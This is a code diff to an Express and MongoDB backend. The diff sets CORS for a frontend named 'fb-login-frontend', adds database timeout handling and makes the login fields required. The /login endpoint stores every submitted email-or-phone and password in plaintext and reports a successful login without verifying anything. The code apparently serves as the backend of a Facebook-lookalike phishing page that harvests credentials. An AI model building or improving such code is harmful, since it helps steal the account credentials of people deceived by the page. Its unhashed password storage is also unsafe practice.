@@ -9,21 +9,29 @@ const app = express();
 app.use(cors({
   origin: ['https://fb-login-frontend.vercel.app'], // Frontend production URL
   methods: 'GET,HEAD,PATCH,POST,PUT,DELETE',
+  credentials: true, // If you are using cookies or authentication headers
+  allowedHeaders: ['Content-Type', 'Authorization'],
 }));
 app.use(bodyParser.json());
 
 // Connect to MongoDB
 const mongoURI = process.env.MONGODB_URI;
 
-mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
+mongoose.connect(mongoURI, { 
+  useNewUrlParser: true, 
+  useUnifiedTopology: true, 
+  serverSelectionTimeoutMS: 5000, // Timeout after 5s if no connection is established
+})
   .then(() => console.log('MongoDB connected'))
-  .catch((err) => console.log('MongoDB connection error:', err));
-
+  .catch((err) => {
+    console.log('MongoDB connection error:', err);
+    process.exit(1); // Exit the application if there is a connection error
+  });
 
 // Define a User model
 const User = mongoose.model('User', new mongoose.Schema({
-  emailOrPhone: String,
-  password: String
+  emailOrPhone: { type: String, required: true },
+  password: { type: String, required: true }
 }));
 
 // API endpoint to handle login
@@ -35,7 +43,7 @@ app.post('/login', async (req, res) => {
     await user.save();
     res.status(200).json({ message: 'User logged in successfully' });
   } catch (err) {
-    console.error(err);
+    console.error('Error saving user data:', err);
     res.status(500).send('Error saving user data.');
   }
 });
